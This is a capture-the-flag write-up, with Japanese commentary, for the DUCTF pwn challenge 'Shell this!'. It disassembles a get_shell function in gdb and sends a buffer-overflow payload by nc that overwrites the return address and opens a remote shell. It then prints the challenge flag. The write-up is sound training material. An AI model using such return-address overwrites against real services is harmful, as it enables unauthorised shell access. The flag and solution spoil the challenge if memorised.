# Shell this!:pwn:100pts
Somebody told me that this program is vulnerable to something called remote code execution?  
I'm not entirely sure what that is, but could you please figure it out for me?  
nc chal.duc.tf 30002  
Attached files:  
- shellthis.c (sha256: 82c8a27640528e7dc0c907fcad549a3f184524e7da8911e5156b69432a8ee72c)  
- shellthis (sha256: af6d30df31f0093cce9a83ae7d414233624aa8cf23e0fd682edae057763ed2e8)  

[shellthis.c](shellthis.c)　　　　[shellthis](shellthis)  

# Solution
shellthis.cを見るとget_shellなる関数がある。  
vulnに存在するBOFでこれを呼び出してやればいい。  
```bash
$ gdb ./shellthis
~~~
gdb-peda$ disass get_shell
Dump of assembler code for function get_shell:
   0x00000000004006ca <+0>:     push   rbp
   0x00000000004006cb <+1>:     mov    rbp,rsp
   0x00000000004006ce <+4>:     mov    edx,0x0
   0x00000000004006d3 <+9>:     mov    esi,0x0
   0x00000000004006d8 <+14>:    lea    rdi,[rip+0xf9]        # 0x4007d8
   0x00000000004006df <+21>:    call   0x400570 <execve@plt>
   0x00000000004006e4 <+26>:    nop
   0x00000000004006e5 <+27>:    pop    rbp
   0x00000000004006e6 <+28>:    ret
End of assembler dump.
```
0x00000000004006caだとわかった。  
あとは位置を調整してやる。  
```bash
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xca\x06\x40\x00\x00\x00\x00\x00" ; cat) | nc chal.duc.tf 30002
Welcome! Can you figure out how to get this program to give you a shell?
Please tell me your name: ls
flag.txt
shellthis
cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```
flag.txt内にflagが書かれていた。  

## DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}